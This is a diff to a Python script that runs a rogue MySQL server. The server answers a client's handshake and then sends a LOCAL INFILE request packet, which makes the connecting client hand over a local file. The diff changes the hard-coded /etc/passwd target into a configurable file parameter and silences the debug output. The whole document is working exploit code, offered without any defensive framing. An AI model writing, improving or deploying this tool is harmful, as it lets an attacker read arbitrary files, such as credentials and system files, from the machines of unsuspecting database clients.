@@ -7,7 +7,7 @@ import os
 def rand_str(num):
     up = "FF" * num
     down = "1" + ("00" * (num - 1))
-    print(down, up)
+    # print(down, up)
     return bytes.fromhex(str(hex(random.randint(int(down, 16), int(up, 16))))[2:])
 
 def str_hex(string):
@@ -15,24 +15,25 @@ def str_hex(string):
 
 
 class mysql:
-    def __init__(self, addrress, port = 3306, count = 1):
+    def __init__(self, addrress, port = 3306, count = 1, file="/etc/passwd"):
         self.info = (addrress, port)
         self.count = count
+        self.file = file
     def start(self):
         ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ss.bind((self.info))
         ss.listen(self.count)
         conn, addr = ss.accept()
         data = self.greet()
-        print(str_hex(data))
+        # print(str_hex(data))
         conn.send(data)
-        print(conn.recv(1024))
+        conn.recv(1024)
         data = self.resp_ok()
-        print(str_hex(data))
+        # print(str_hex(data))
         conn.send(data)
-        print(conn.recv(1024))
+        conn.recv(1024)
         data = self.attack()
-        print(str_hex(data))
+        # print(str_hex(data))
         conn.send(data)
         print(conn.recv(1024))
         conn.close()
@@ -71,7 +72,7 @@ class mysql:
         pck_num = b"\x01"
 
         num_field = b"\xfb"
-        payload = b"/etc/passwd"
+        payload = self.file.encode()
 
         data = num_field + payload
         length = struct.pack("i", len(data))[:3]
